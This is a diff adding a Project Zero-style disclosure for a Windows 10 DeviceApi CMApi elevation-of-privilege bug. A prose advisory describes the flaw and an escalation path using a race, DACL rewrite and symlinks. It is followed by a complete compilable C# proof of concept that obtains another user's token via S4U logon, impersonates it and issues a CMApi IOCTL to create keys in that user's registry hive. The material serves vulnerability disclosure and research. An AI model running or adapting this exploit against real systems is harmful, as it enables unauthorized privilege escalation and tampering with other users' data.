@@ -1,0 +1,1003 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=875
+
+Windows: DeviceApi CMApi User Hive Impersonation EoP
+Platform: Windows 10 10586 not tested 8.1 Update 2 or Windows 7
+Class: Elevation of Privilege
+
+Summary:
+The DeviceApi CMApi PnpCtxRegOpenCurrentUserKey function doesn’t check the impersonation level of the current effective token allowing a normal user to create arbitrary registry keys in another user’s loaded hive leading to elevation of privilege.
+
+Description:
+
+For some of the CMApi IOCTLs you can specify a flag, 0x100 which indicates you want the keys to opened in the user’s hive rather than the system hive. It finds the root key by calling PnpCtxRegOpenCurrentUserKey which calls ZwQueryInformationToken for the TOKEN_USER structure, converts the SID to a string, appends it to \Registry\User and opens the key in kernel mode. No part of this process verifies that the effective token isn’t an impersonation token at identification level, this means that capturing another user’s token, or using something like S4U we can impersonate another logged on user and write registry keys into their hive. Combined with the fact that registry keys are created with kernel privileges (even when dealing with user hives, when it clearly shouldn’t) when the keys are actually created the access check is bypassed.
+
+The obvious way of exploiting this is to use the PiCMOpenDeviceKey IOCTL I’ve already reported in issue 34167. We can do a similar trick but instead symlink to keys inside the user’s hive to get elevation. One issue is that when the keys are created in kernel mode they’ll typically not be accessible by the user due to the default inherited permissions on a user’s hive. However there’s a winnable race between when the user hive is accessed and when the keys are created, by clearing the thread token from another thread at the right moment the user hive will be the target user but the keys are created as the current user. While this doesn’t directly give us access to the keys through the DACL it does mark us as the owner of the key and so we can open it for WRITE_DAC access and change the DACL to give us access, then do a similar symlink trick to 34167 to elevate privileges.
+
+Proof of Concept:
+
+I’ve provided a PoC as a C# source code file. You need to compile it first targeted .NET 4 and above. It requires some setup first, to create the other user. Also this only demonstrates the arbitrary creation, it doesn’t attempt to win the race condition. 
+
+1) Compile the C# source code file.
+2) Create a second user on the local system as an admin, start a program running as that user so that their hive is loaded (using either runas or fast user switching).
+3) Execute the PoC executable as a normal user, passing as an argument the name of the other user
+3) The PoC should print that it failed to get the key (this is related to the key being opened under identification level impersonation) however using a registry viewer observe that under HKU\User-SID\SYSTEM\CurrentControlSet\Enum the device key’s been created.
+
+Expected Result:
+The key access should fail
+
+Observed Result:
+The key creation succeeds inside the other user’s hive.
+*/
+
+using Microsoft.Win32;
+using Microsoft.Win32.SafeHandles;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+namespace PoC
+{
+  /// <remarks>
+  /// This sample uses S4U security, which requires Windows Server 2003 and a W2003 domain controller
+  /// Copied from pinvoke.net with minor changes to get it to actually work.
+  /// </remarks>
+  public sealed class CCWinLogonUtilities
+  {
+    private CCWinLogonUtilities()
+    {
+    }
+
+    #region "Win32 stuff"
+    private class Win32
+    {
+      internal class OSCalls
+      {
+        public enum WinStatusCodes : uint
+        {
+          STATUS_SUCCESS = 0
+        }
+
+        public enum WinErrors : uint
+        {
+          NO_ERROR = 0,
+        }
+        public enum WinLogonType
+        {
+          LOGON32_LOGON_INTERACTIVE = 2,
+          LOGON32_LOGON_NETWORK = 3,
+          LOGON32_LOGON_BATCH = 4,
+          LOGON32_LOGON_SERVICE = 5,
+          LOGON32_LOGON_UNLOCK = 7,
+          LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
+          LOGON32_LOGON_NEW_CREDENTIALS = 9
+        }
+
+        // SECURITY_LOGON_TYPE
+        public enum SecurityLogonType
+        {
+          Interactive = 2,    // Interactively logged on (locally or remotely)
+          Network,        // Accessing system via network
+          Batch,          // Started via a batch queue
+          Service,        // Service started by service controller
+          Proxy,          // Proxy logon
+          Unlock,         // Unlock workstation
+          NetworkCleartext,   // Network logon with cleartext credentials
+          NewCredentials,     // Clone caller, new default credentials
+          RemoteInteractive,  // Remote, yet interactive. Terminal server
+          CachedInteractive,  // Try cached credentials without hitting the net.
+          CachedRemoteInteractive, // Same as RemoteInteractive, this is used internally for auditing purpose
+          CachedUnlock    // Cached Unlock workstation
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LSA_UNICODE_STRING
+        {
+          public UInt16 Length;
+          public UInt16 MaximumLength;
+          public IntPtr Buffer;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_SOURCE
+        {
+          public TOKEN_SOURCE(string name)
+          {
+            SourceName = new byte[8];
+            System.Text.Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
+            if (!AllocateLocallyUniqueId(out SourceIdentifier))
+              throw new System.ComponentModel.Win32Exception();
+          }
+
+          [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+          public byte[] SourceName;
+          public UInt64 SourceIdentifier;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct QUOTA_LIMITS
+        {
+          UInt32 PagedPoolLimit;
+          UInt32 NonPagedPoolLimit;
+          UInt32 MinimumWorkingSetSize;
+          UInt32 MaximumWorkingSetSize;
+          UInt32 PagefileLimit;
+          Int64 TimeLimit;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LSA_STRING
+        {
+          public UInt16 Length;
+          public UInt16 MaximumLength;
+          public /*PCHAR*/ IntPtr Buffer;
+        }
+
+        public class LsaStringWrapper : IDisposable
+        {
+          public LSA_STRING _string;
+
+          public LsaStringWrapper(string value)
+          {
+            _string = new LSA_STRING();
+            _string.Length = (ushort)value.Length;
+            _string.MaximumLength = (ushort)value.Length;
+            _string.Buffer = Marshal.StringToHGlobalAnsi(value);
+          }
+
+          ~LsaStringWrapper()
+          {
+            Dispose(false);
+          }
+
+          private void Dispose(bool disposing)
+          {
+            if (_string.Buffer != IntPtr.Zero)
+            {
+              Marshal.FreeHGlobal(_string.Buffer);
+              _string.Buffer = IntPtr.Zero;
+            }
+            if (disposing)
+              GC.SuppressFinalize(this);
+          }
+
+          #region IDisposable Members
+
+          public void Dispose()
+          {
+            Dispose(true);
+          }
+
+          #endregion
+        }
+
+        public class KerbS4ULogon : IDisposable
+        {
+          [StructLayout(LayoutKind.Sequential)]
+          public struct KERB_S4U_LOGON
+          {
+            public Int32 MessageType;    // Should be 12
+            public Int32 Flags; // Reserved, should be 0
+            public LSA_UNICODE_STRING ClientUpn;   // REQUIRED: UPN for client
+            public LSA_UNICODE_STRING ClientRealm; // Optional: Client Realm, if known
+          }
+
+          public KerbS4ULogon(string clientUpn) : this(clientUpn, null)
+          {
+          }
+
+          public KerbS4ULogon(string clientUpn, string clientRealm)
+          {
+            int clientUpnLen = (clientUpn == null) ? 0 : clientUpn.Length;
+            int clientRealmLen = (clientRealm == null) ? 0 : clientRealm.Length;
+            _bufferLength = Marshal.SizeOf(typeof(KERB_S4U_LOGON)) + 2 * (clientUpnLen + clientRealmLen);
+            _bufferContent = Marshal.AllocHGlobal(_bufferLength);
+            if (_bufferContent == IntPtr.Zero)
+              throw new OutOfMemoryException("Could not allocate memory for KerbS4ULogon structure");
+            try
+            {
+              KERB_S4U_LOGON baseStructure = new KERB_S4U_LOGON();
+              baseStructure.MessageType = 12;    // KerbS4ULogon
+              baseStructure.Flags = 0;
+              baseStructure.ClientUpn.Length = (UInt16)(2 * clientUpnLen);
+              baseStructure.ClientUpn.MaximumLength = (UInt16)(2 * clientUpnLen);
+              IntPtr curPtr = new IntPtr(_bufferContent.ToInt64() + Marshal.SizeOf(typeof(KERB_S4U_LOGON)));
+
+              if (clientUpnLen > 0)
+              {
+                baseStructure.ClientUpn.Buffer = curPtr;
+                Marshal.Copy(clientUpn.ToCharArray(), 0, curPtr, clientUpnLen);
+                curPtr = new IntPtr(curPtr.ToInt64() + clientUpnLen * 2);
+              }
+              else
+                baseStructure.ClientUpn.Buffer = IntPtr.Zero;
+              baseStructure.ClientRealm.Length = (UInt16)(2 * clientRealmLen);
+              baseStructure.ClientRealm.MaximumLength = (UInt16)(2 * clientRealmLen);
+              if (clientRealmLen > 0)
+              {
+                baseStructure.ClientRealm.Buffer = curPtr;
+                Marshal.Copy(clientRealm.ToCharArray(), 0, curPtr, clientRealmLen);
+              }
+              else
+                baseStructure.ClientRealm.Buffer = IntPtr.Zero;
+              Marshal.StructureToPtr(baseStructure, _bufferContent, false);
+            }
+            catch
+            {
+              Dispose(true);
+              throw;
+            }
+          }
+
+          private IntPtr _bufferContent;
+          private int _bufferLength;
+
+          public IntPtr Ptr
+          {
+            get { return _bufferContent; }
+          }
+
+          public int Length
+          {
+            get { return _bufferLength; }
+          }
+
+          private void Dispose(bool disposing)
+          {
+            if (_bufferContent != IntPtr.Zero)
+            {
+              Marshal.FreeHGlobal(_bufferContent);
+              _bufferContent = IntPtr.Zero;
+            }
+            if (disposing)
+              GC.SuppressFinalize(this);
+          }
+
+          ~KerbS4ULogon()
+          {
+            Dispose(false);
+          }
+
+          #region IDisposable Members
+
+          public void Dispose()
+          {
+            Dispose(true);
+          }
+
+          #endregion
+        }
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = false)]
+        public static extern WinErrors LsaNtStatusToWinError(WinStatusCodes status);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool AllocateLocallyUniqueId([Out] out UInt64 Luid);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int CloseHandle(IntPtr hObject);
+
+        [DllImport("secur32.dll", SetLastError = false)]
+        public static extern WinStatusCodes LsaLogonUser(
+            [In] IntPtr LsaHandle,
+            [In] ref LSA_STRING OriginName,
+            [In] SecurityLogonType LogonType,
+            [In] UInt32 AuthenticationPackage,
+            [In] IntPtr AuthenticationInformation,
+            [In] UInt32 AuthenticationInformationLength,
+            [In] /*PTOKEN_GROUPS*/ IntPtr LocalGroups,
+            [In] ref TOKEN_SOURCE SourceContext,
+            [Out] /*PVOID*/ out IntPtr ProfileBuffer,
+            [Out] out UInt32 ProfileBufferLength,
+            [Out] out Int64 LogonId,
+            [Out] out IntPtr Token,
+            [Out] out QUOTA_LIMITS Quotas,
+            [Out] out WinStatusCodes SubStatus
+            );
+
+        [DllImport("secur32.dll", SetLastError = false)]
+        public static extern WinStatusCodes LsaFreeReturnBuffer(
+            [In] IntPtr buffer);
+
+        [DllImport("secur32.dll", SetLastError = false)]
+        public static extern WinStatusCodes LsaConnectUntrusted([Out] out IntPtr LsaHandle);
+
+        [DllImport("secur32.dll", SetLastError = false)]
+        public static extern WinStatusCodes LsaDeregisterLogonProcess([In] IntPtr LsaHandle);
+
+        [DllImport("secur32.dll", SetLastError = false)]
+        public static extern WinStatusCodes LsaLookupAuthenticationPackage([In] IntPtr LsaHandle, [In] ref LSA_STRING PackageName, [Out] out UInt32 AuthenticationPackage);
+
+      }
+
+      public sealed class HandleSecurityToken
+          : IDisposable
+      {
+        private IntPtr m_hToken = IntPtr.Zero;
+
+        // using S4U logon
+        public HandleSecurityToken(string UserName,
+            string Domain,
+            OSCalls.WinLogonType LogonType
+            )
+        {
+          using (OSCalls.KerbS4ULogon authPackage = new OSCalls.KerbS4ULogon(UserName, Domain))
+          {
+            IntPtr lsaHandle;
+            OSCalls.WinStatusCodes status = OSCalls.LsaConnectUntrusted(out lsaHandle);
+            if (status != OSCalls.WinStatusCodes.STATUS_SUCCESS)
+              throw new System.ComponentModel.Win32Exception((int)OSCalls.LsaNtStatusToWinError(status));
+            try
+            {
+              UInt32 kerberosPackageId;
+              using (OSCalls.LsaStringWrapper kerberosPackageName = new OSCalls.LsaStringWrapper("Negotiate"))
+              {
+                status = OSCalls.LsaLookupAuthenticationPackage(lsaHandle, ref kerberosPackageName._string, out kerberosPackageId);
+                if (status != OSCalls.WinStatusCodes.STATUS_SUCCESS)
+                  throw new System.ComponentModel.Win32Exception((int)OSCalls.LsaNtStatusToWinError(status));
+              }
+              OSCalls.LsaStringWrapper originName = null;
+              try
+              {
+                originName = new OSCalls.LsaStringWrapper("S4U");
+                OSCalls.TOKEN_SOURCE sourceContext = new OSCalls.TOKEN_SOURCE("NtLmSsp");
+                System.IntPtr profileBuffer = IntPtr.Zero;
+                UInt32 profileBufferLength = 0;
+                Int64 logonId;
+                OSCalls.WinStatusCodes subStatus;
+                OSCalls.QUOTA_LIMITS quotas;
+                status = OSCalls.LsaLogonUser(
+                    lsaHandle,
+                    ref originName._string,
+                    (OSCalls.SecurityLogonType)LogonType,
+                    kerberosPackageId,
+                    authPackage.Ptr,
+                    (uint)authPackage.Length,
+                    IntPtr.Zero,
+                    ref sourceContext,
+                    out profileBuffer,
+                    out profileBufferLength,
+                    out logonId,
+                    out m_hToken,
+                    out quotas,
+                    out subStatus);
+                if (status != OSCalls.WinStatusCodes.STATUS_SUCCESS)
+                  throw new System.ComponentModel.Win32Exception((int)OSCalls.LsaNtStatusToWinError(status));
+                if (profileBuffer != IntPtr.Zero)
+                  OSCalls.LsaFreeReturnBuffer(profileBuffer);
+              }
+              finally
+              {
+                if (originName != null)
+                  originName.Dispose();
+              }
+            }
+            finally
+            {
+              OSCalls.LsaDeregisterLogonProcess(lsaHandle);
+            }
+          }
+        }
+
+        ~HandleSecurityToken()
+        {
+          Dispose(false);
+        }
+
+        public void Dispose()
+        {
+          Dispose(true);
+        }
+
+        private void Dispose(bool disposing)
+        {
+          lock (this)
+          {
+            if (!m_hToken.Equals(IntPtr.Zero))
+            {
+              OSCalls.CloseHandle(m_hToken);
+              m_hToken = IntPtr.Zero;
+            }
+            if (disposing)
+              GC.SuppressFinalize(this);
+          }
+        }
+
+        public System.Security.Principal.WindowsIdentity BuildIdentity()
+        {
+          System.Security.Principal.WindowsIdentity retVal = new System.Security.Principal.WindowsIdentity(m_hToken);
+          GC.KeepAlive(this);
+          return retVal;
+        }
+      }
+
+    }
+
+    #endregion
+
+    /// <summary>
+    /// The Windows Logon Types.
+    /// </summary>
+    public enum WinLogonType
+    {
+      /// <summary>
+      /// Interactive logon
+      /// </summary>
+      LOGON32_LOGON_INTERACTIVE = Win32.OSCalls.WinLogonType.LOGON32_LOGON_INTERACTIVE,
+      /// <summary>
+      /// Network logon
+      /// </summary>
+      LOGON32_LOGON_NETWORK = Win32.OSCalls.WinLogonType.LOGON32_LOGON_NETWORK,
+      /// <summary>
+      /// Batch logon
+      /// </summary>
+      LOGON32_LOGON_BATCH = Win32.OSCalls.WinLogonType.LOGON32_LOGON_BATCH,
+      /// <summary>
+      /// Logon as a service
+      /// </summary>
+      LOGON32_LOGON_SERVICE = Win32.OSCalls.WinLogonType.LOGON32_LOGON_SERVICE,
+      /// <summary>
+      /// Unlock logon
+      /// </summary>
+      LOGON32_LOGON_UNLOCK = Win32.OSCalls.WinLogonType.LOGON32_LOGON_UNLOCK,
+      /// <summary>
+      /// Preserve password logon
+      /// </summary>
+      LOGON32_LOGON_NETWORK_CLEARTEXT = Win32.OSCalls.WinLogonType.LOGON32_LOGON_NETWORK_CLEARTEXT,
+      /// <summary>
+      /// Current token for local access, credentials for network access
+      /// </summary>
+      LOGON32_LOGON_NEW_CREDENTIALS = Win32.OSCalls.WinLogonType.LOGON32_LOGON_NEW_CREDENTIALS
+    }
+
+    /// <summary>
+    /// Logs in a credential for server apps. No need to provide password.
+    /// </summary>
+    /// <param name="credential">The credential to log in. Password is ignored.</param>
+    /// <param name="logonType">The type of logon to use</param>
+    /// <remarks>
+    /// Requires Windows Server 2003 domain account running in Win2003 native domain mode
+    /// </remarks>
+    /// <returns>Returns a <c>System.Security.Principal.WindowsIdentity</c> object</returns>
+    /// Raises an exception with error information if the user cannot log in
+    public static System.Security.Principal.WindowsIdentity CreateIdentityS4U(System.Net.NetworkCredential credential, WinLogonType logonType)
+    {
+      using (Win32.HandleSecurityToken handleToken =
+                  new Win32.HandleSecurityToken(credential.UserName, credential.Domain, (Win32.OSCalls.WinLogonType)logonType))
+        return handleToken.BuildIdentity();
+    }
+
+
+    class Program
+    {
+      [Flags]
+      public enum AttributeFlags : uint
+      {
+        None = 0,
+        Inherit = 0x00000002,
+        Permanent = 0x00000010,
+        Exclusive = 0x00000020,
+        CaseInsensitive = 0x00000040,
+        OpenIf = 0x00000080,
+        OpenLink = 0x00000100,
+        KernelHandle = 0x00000200,
+        ForceAccessCheck = 0x00000400,
+        IgnoreImpersonatedDevicemap = 0x00000800,
+        DontReparse = 0x00001000,
+      }
+
+      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+      public sealed class UnicodeString
+      {
+        ushort Length;
+        ushort MaximumLength;
+        [MarshalAs(UnmanagedType.LPWStr)]
+        string Buffer;
+
+        public UnicodeString(string str)
+        {
+          Length = (ushort)(str.Length * 2);
+          MaximumLength = (ushort)((str.Length * 2) + 1);
+          Buffer = str;
+        }
+      }
+
+      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+      public sealed class ObjectAttributes : IDisposable
+      {
+        int Length;
+        IntPtr RootDirectory;
+        IntPtr ObjectName;
+        AttributeFlags Attributes;
+        IntPtr SecurityDescriptor;
+        IntPtr SecurityQualityOfService;
+
+        private static IntPtr AllocStruct(object s)
+        {
+          int size = Marshal.SizeOf(s);
+          IntPtr ret = Marshal.AllocHGlobal(size);
+          Marshal.StructureToPtr(s, ret, false);
+          return ret;
+        }
+
+        private static void FreeStruct(ref IntPtr p, Type struct_type)
+        {
+          Marshal.DestroyStructure(p, struct_type);
+          Marshal.FreeHGlobal(p);
+          p = IntPtr.Zero;
+        }
+
+        public ObjectAttributes(string object_name, AttributeFlags flags, IntPtr rootkey)
+        {
+          Length = Marshal.SizeOf(this);
+          if (object_name != null)
+          {
+            ObjectName = AllocStruct(new UnicodeString(object_name));
+          }
+          Attributes = flags;
+          RootDirectory = rootkey;
+        }
+
+        public ObjectAttributes(string object_name, AttributeFlags flags)
+          : this(object_name, flags, IntPtr.Zero)
+        {
+        }
+
+        public void Dispose()
+        {
+          if (ObjectName != IntPtr.Zero)
+          {
+            FreeStruct(ref ObjectName, typeof(UnicodeString));
+          }
+          GC.SuppressFinalize(this);
+        }
+
+        ~ObjectAttributes()
+        {
+          Dispose();
+        }
+      }
+
+      [Flags]
+      public enum LoadKeyFlags
+      {
+        None = 0,
+        AppKey = 0x10,
+        Exclusive = 0x20,
+        Unknown800 = 0x800,
+        ReadOnly = 0x2000,
+      }
+
+      [Flags]
+      public enum GenericAccessRights : uint
+      {
+        None = 0,
+        GenericRead = 0x80000000,
+        GenericWrite = 0x40000000,
+        GenericExecute = 0x20000000,
+        GenericAll = 0x10000000,
+        Delete = 0x00010000,
+        ReadControl = 0x00020000,
+        WriteDac = 0x00040000,
+        WriteOwner = 0x00080000,
+        Synchronize = 0x00100000,
+        MaximumAllowed = 0x02000000,
+      }
+
+      public class NtException : ExternalException
+      {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string modulename);
+
+        [Flags]
+        enum FormatFlags
+        {
+          AllocateBuffer = 0x00000100,
+          FromHModule = 0x00000800,
+          FromSystem = 0x00001000,
+          IgnoreInserts = 0x00000200
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern int FormatMessage(
+          FormatFlags dwFlags,
+          IntPtr lpSource,
+          int dwMessageId,
+          int dwLanguageId,
+          out IntPtr lpBuffer,
+          int nSize,
+          IntPtr Arguments
+        );
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr LocalFree(IntPtr p);
+
+        private static string StatusToString(int status)
+        {
+          IntPtr buffer = IntPtr.Zero;
+          try
+          {
+            if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
+                GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
+            {
+              return Marshal.PtrToStringUni(buffer);
+            }
+          }
+          finally
+          {
+            if (buffer != IntPtr.Zero)
+            {
+              LocalFree(buffer);
+            }
+          }
+          return String.Format("Unknown Error: 0x{0:X08}", status);
+        }
+
+        public NtException(int status) : base(StatusToString(status))
+        {
+        }
+      }
+
+      public static void StatusToNtException(int status)
+      {
+        if (status < 0)
+        {
+          throw new NtException(status);
+        }
+      }
+
+
+      [Flags]
+      public enum FileOpenOptions
+      {
+        None = 0,
+        DirectoryFile = 0x00000001,
+        WriteThrough = 0x00000002,
+        SequentialOnly = 0x00000004,
+        NoIntermediateBuffering = 0x00000008,
+        SynchronousIoAlert = 0x00000010,
+        SynchronousIoNonAlert = 0x00000020,
+        NonDirectoryFile = 0x00000040,
+        CreateTreeConnection = 0x00000080,
+        CompleteIfOplocked = 0x00000100,
+        NoEaKnowledge = 0x00000200,
+        OpenRemoteInstance = 0x00000400,
+        RandomAccess = 0x00000800,
+        DeleteOnClose = 0x00001000,
+        OpenByFileId = 0x00002000,
+        OpenForBackupIntent = 0x00004000,
+        NoCompression = 0x00008000,
+        OpenRequiringOplock = 0x00010000,
+        ReserveOpfilter = 0x00100000,
+        OpenReparsePoint = 0x00200000,
+        OpenNoRecall = 0x00400000,
+        OpenForFreeSpaceQuery = 0x00800000
+      }
+
+      public class IoStatusBlock
+      {
+        public IntPtr Pointer;
+        public IntPtr Information;
+
+        public IoStatusBlock(IntPtr pointer, IntPtr information)
+        {
+          Pointer = pointer;
+          Information = information;
+        }
+
+        public IoStatusBlock()
+        {
+        }
+      }
+
+      [Flags]
+      public enum ShareMode
+      {
+        None = 0,
+        Read = 0x00000001,
+        Write = 0x00000002,
+        Delete = 0x00000004,
+      }
+
+      [Flags]
+      public enum FileAccessRights : uint
+      {
+        None = 0,
+        ReadData = 0x0001,
+        WriteData = 0x0002,
+        AppendData = 0x0004,
+        ReadEa = 0x0008,
+        WriteEa = 0x0010,
+        Execute = 0x0020,
+        DeleteChild = 0x0040,
+        ReadAttributes = 0x0080,
+        WriteAttributes = 0x0100,
+        GenericRead = 0x80000000,
+        GenericWrite = 0x40000000,
+        GenericExecute = 0x20000000,
+        GenericAll = 0x10000000,
+        Delete = 0x00010000,
+        ReadControl = 0x00020000,
+        WriteDac = 0x00040000,
+        WriteOwner = 0x00080000,
+        Synchronize = 0x00100000,
+        MaximumAllowed = 0x02000000,
+      }
+
+      [DllImport("ntdll.dll")]
+      public static extern int NtOpenFile(
+          out IntPtr FileHandle,
+          FileAccessRights DesiredAccess,
+          ObjectAttributes ObjAttr,
+          [In] [Out] IoStatusBlock IoStatusBlock,
+          ShareMode ShareAccess,
+          FileOpenOptions OpenOptions);
+
+      [DllImport("ntdll.dll")]
+      public static extern int NtDeviceIoControlFile(
+        SafeFileHandle FileHandle,
+        IntPtr Event,
+        IntPtr ApcRoutine,
+        IntPtr ApcContext,
+        [In] [Out] IoStatusBlock IoStatusBlock,
+        uint IoControlCode,
+        SafeHGlobalBuffer InputBuffer,
+        int InputBufferLength,
+        SafeHGlobalBuffer OutputBuffer,
+        int OutputBufferLength
+      );
+
+      static T DeviceIoControl<T>(SafeFileHandle FileHandle, uint IoControlCode, object input_buffer)
+      {
+        using (SafeStructureOutBuffer<T> output = new SafeStructureOutBuffer<T>())
+        {
+          using (SafeStructureBuffer input = new SafeStructureBuffer(input_buffer))
+          {
+            IoStatusBlock status = new IoStatusBlock();
+            StatusToNtException(NtDeviceIoControlFile(FileHandle, IntPtr.Zero, IntPtr.Zero,
+              IntPtr.Zero, status, IoControlCode, input, input.Length,
+              output, output.Length));
+
+            return output.Result;
+          }
+        }
+      }
+
+      public static SafeFileHandle OpenFile(string name, FileAccessRights DesiredAccess, ShareMode ShareAccess, FileOpenOptions OpenOptions, bool inherit)
+      {
+        AttributeFlags flags = AttributeFlags.CaseInsensitive;
+        if (inherit)
+          flags |= AttributeFlags.Inherit;
+        using (ObjectAttributes obja = new ObjectAttributes(name, flags))
+        {
+          IntPtr handle;
+          IoStatusBlock iostatus = new IoStatusBlock();
+          StatusToNtException(NtOpenFile(out handle, DesiredAccess, obja, iostatus, ShareAccess, OpenOptions));
+          return new SafeFileHandle(handle, true);
+        }
+      }
+
+      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+      class CmApiOpenKeyData
+      {
+        public int cbSize; // 0
+        public int device_type; // 4
+        public int callback_id; // 8
+        [MarshalAs(UnmanagedType.LPWStr)]
+        public string name;  // c
+        public int name_size; // 10
+        public GenericAccessRights desired_access; // 14	
+        public int create; // 18
+        public int hardware_id; // 1c
+        public int return_data_size; // 20
+
+        public CmApiOpenKeyData(int device_type, int callback_id, string name, GenericAccessRights desired_access, bool create, int hardware_id, int return_data_size)
+        {
+          this.cbSize = Marshal.SizeOf(this);
+          this.device_type = device_type;
+          this.callback_id = callback_id;
+          this.name = name;
+          this.name_size = (name.Length + 1) * 2;
+          this.desired_access = desired_access;
+          this.create = create ? 1 : 0;
+          this.hardware_id = hardware_id;
+          this.return_data_size = return_data_size;
+        }
+      }
+
+      [StructLayout(LayoutKind.Sequential)]
+      class CmApiOpenKeyResult
+      {
+        int size;
+        public int status;
+        public long handle;
+      };
+
+      public class SafeHGlobalBuffer : SafeHandleZeroOrMinusOneIsInvalid
+      {
+        public SafeHGlobalBuffer(int length)
+          : this(Marshal.AllocHGlobal(length), length, true)
+        {
+        }
+
+        public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
+          : base(owns_handle)
+        {
+          Length = length;
+          SetHandle(buffer);
+        }
+
+        public int Length
+        {
+          get; private set;
+        }
+
+        protected override bool ReleaseHandle()
+        {
+          if (!IsInvalid)
+          {
+            Marshal.FreeHGlobal(handle);
+            handle = IntPtr.Zero;
+          }
+          return true;
+        }
+      }
+
+      public class SafeStructureBuffer : SafeHGlobalBuffer
+      {
+        Type _type;
+
+        public SafeStructureBuffer(object value) : base(Marshal.SizeOf(value))
+        {
+          _type = value.GetType();
+          Marshal.StructureToPtr(value, handle, false);
+        }
+
+        protected override bool ReleaseHandle()
+        {
+          if (!IsInvalid)
+          {
+            Marshal.DestroyStructure(handle, _type);
+          }
+          return base.ReleaseHandle();
+        }
+      }
+
+      public class SafeStructureOutBuffer<T> : SafeHGlobalBuffer
+      {
+        public SafeStructureOutBuffer() : base(Marshal.SizeOf(typeof(T)))
+        {
+        }
+
+        public T Result
+        {
+          get
+          {
+            if (IsInvalid)
+              throw new ObjectDisposedException("handle");
+
+            return Marshal.PtrToStructure<T>(handle);
+          }
+        }
+      }
+
+      static void EnumKeys(RegistryKey rootkey, IEnumerable<string> name_parts, List<string> names, int maxdepth, int current_depth)
+      {
+        if (current_depth == maxdepth)
+        {
+          names.Add(String.Join(@"\", name_parts));
+        }
+        else
+        {
+          foreach (string subkey in rootkey.GetSubKeyNames())
+          {
+            using (RegistryKey key = rootkey.OpenSubKey(subkey))
+            {
+              if (key != null)
+              {
+                EnumKeys(key, name_parts.Concat(new string[] { subkey }), names, maxdepth, current_depth + 1);
+              }
+            }
+          }
+        }
+      }
+
+      static IEnumerable<string> GetValidDeviceNames()
+      {
+        List<string> names = new List<string>();
+        using (RegistryKey rootkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum"))
+        {
+          EnumKeys(rootkey, new string[0], names, 3, 0);
+        }
+        return names;
+      }      
+
+      static void CreateDeviceKey(string device_name, WindowsIdentity identity)
+      {
+        using (SafeFileHandle handle = OpenFile(@"\Device\DeviceApi\CMApi", FileAccessRights.Synchronize | FileAccessRights.GenericRead | FileAccessRights.GenericWrite,
+          ShareMode.None, FileOpenOptions.NonDirectoryFile | FileOpenOptions.SynchronousIoNonAlert, false))
+        {
+          CmApiOpenKeyData data = new CmApiOpenKeyData(0x111, 1, device_name, GenericAccessRights.MaximumAllowed, true, 0, Marshal.SizeOf(typeof(CmApiOpenKeyResult)));
+          CmApiOpenKeyResult result = null;
+          WindowsImpersonationContext ctx = null;
+          if (identity != null)
+          {
+            ctx = identity.Impersonate();
+          }
+          try
+          {
+            result = DeviceIoControl<CmApiOpenKeyResult>(handle, 0x47085B, data);
+          }
+          finally
+          {
+            if (ctx != null)
+            {
+              ctx.Undo();
+            }
+          }
+
+          StatusToNtException(result.status);
+        }
+      }
+
+      static bool DoExploit(string username)
+      {
+        try
+        {
+          WindowsIdentity id = CCWinLogonUtilities.CreateIdentityS4U(new NetworkCredential(username, "", Environment.UserDomainName),
+            CCWinLogonUtilities.WinLogonType.LOGON32_LOGON_NETWORK);
+          bool found_hive = false;
+          foreach (string subkey in Registry.Users.GetSubKeyNames())
+          {
+            string user_name = id.User.ToString();
+            if (subkey.Equals(user_name, StringComparison.OrdinalIgnoreCase))
+            {
+              found_hive = true;
+              break;
+            }
+          }
+
+          if (!found_hive)
+          {
+            throw new ArgumentException("Couldn't find user hive, make sure the user's logged on");
+          }
+                    
+          string device_name = GetValidDeviceNames().First();          
+          Console.WriteLine("[SUCCESS]: Found Device: {0}", device_name);
+          
+          CreateDeviceKey(device_name, id);
+        }
+        catch (Exception ex)
+        {
+          Console.WriteLine("[ERROR]: {0}", ex.ToString());
+        }
+
+        return false;
+      }
+
+      static int GetSessionId()
+      {
+        using (Process p = Process.GetCurrentProcess())
+        {
+          return p.SessionId;
+        }
+      }
+
+      static void Main(string[] args)
+      {
+        if (args.Length < 1)
+        {
+          Console.WriteLine("Usage: PoC username");
+        }
+        else
+        {
+          DoExploit(args[0]);
+        }
+      }
+    }
+  }
+}
